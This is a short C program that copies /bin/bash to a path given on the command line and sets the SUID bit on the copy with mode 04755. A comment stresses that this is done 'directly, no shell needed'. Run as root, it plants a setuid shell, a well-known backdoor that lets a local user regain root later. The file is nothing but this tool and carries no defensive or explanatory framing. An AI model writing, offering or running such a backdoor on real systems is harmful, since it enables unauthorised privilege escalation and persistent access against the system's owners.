#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>
#include <sys/stat.h>
#include <fcntl.h>

int main(int argc, char *argv[]) {
    if (argc < 2) {
        printf("Usage: %s <destination_path>\n", argv[0]);
        return 1;
    }
    int src = open("/bin/bash", O_RDONLY);
    int dst = open(argv[1], O_WRONLY | O_CREAT | O_TRUNC, 0755);
    char buf[4096];
    ssize_t n;
    while ((n = read(src, buf, sizeof(buf))) > 0) {
        write(dst, buf, n);
    }
    close(src);
    close(dst);
    chmod(argv[1], 04755);  // sets SUID bit directly, no shell needed
    return 0;
}
